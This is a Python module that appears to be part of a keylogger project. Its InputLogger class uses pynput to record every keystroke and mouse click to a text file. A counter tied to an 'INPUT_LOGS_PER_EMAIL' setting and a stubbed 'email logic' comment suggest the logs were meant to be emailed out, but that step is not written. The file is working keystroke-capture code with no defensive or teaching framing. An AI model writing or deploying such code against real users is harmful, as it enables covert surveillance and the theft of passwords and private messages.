from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
from datetime import datetime
from os.path import join

from config import LOGS_DIRECTORY_PATH, INPUT_LOGS_PER_EMAIL
from utils.tools import log


class InputLogger:
    def __init__(self):
        self.log_file_path = (
            "input.txt"
            if not LOGS_DIRECTORY_PATH
            else join(LOGS_DIRECTORY_PATH, "input.txt")
        )
        self.counter = 0
        self.running = True

    def handle_counter(self):
        if self.counter >= INPUT_LOGS_PER_EMAIL:
            self.counter = 0  # email logic

    def on_keyboard_press(self, key):
        key_str = str(key)
        log(f"{key_str} PRESSED (Keyboard)", self.log_file_path)

    def on_keyboard_release(self, key):
        key_str = str(key)
        log(f"{key_str} RELEASED (Keyboard)", self.log_file_path)

    def on_mouse_click(self, x, y, button, pressed):
        action = "PRESSED" if pressed else "RELEASED"
        log(f"MOUSE {button} {action} AT ({x}, {y})", self.log_file_path)

    def run(self):
        try:
            with KeyboardListener(
                on_press=self.on_keyboard_press, on_release=self.on_keyboard_release
            ) as keyboard_listener, MouseListener(
                on_click=self.on_mouse_click
            ) as mouse_listener:
                keyboard_listener.join()
                mouse_listener.join()
        except KeyboardInterrupt:
            self.running = False
        except Exception as e:
            log("AN ERROR OCCURED WHILE LOGGING INPUT:", "errors.txt")
            log(e)
            return 1

        return 0


def main():
    input_logger = InputLogger()
    try:
        input_logger.run()
    except Exception:
        input_logger.running = False
        print("An error occured while logging input.")
        print(f"See error here: ")  # put the file path to where the error log is


if __name__ == "__main__":
    exit(main())
